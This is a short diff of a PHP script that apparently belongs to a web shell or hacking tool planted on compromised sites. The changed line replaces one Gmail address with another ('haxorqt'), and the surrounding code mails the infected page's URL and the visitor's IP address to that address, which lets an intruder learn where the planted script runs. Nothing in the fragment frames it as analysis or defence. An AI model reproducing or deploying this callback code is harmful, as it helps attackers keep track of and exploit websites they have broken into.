@@ -11,7 +11,7 @@
 set_time_limit(0);
 ini_set('memory_limit', '64M');
 header('Content-Type: text/html; charset=UTF-8');
-$destinationmail = 'panteqcrew@gmail.com';
+$destinationmail = 'haxorqt@gmail.com';
 $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $mail_alert = "Bug $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
 mail($destinationmail, "MD", $mail_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
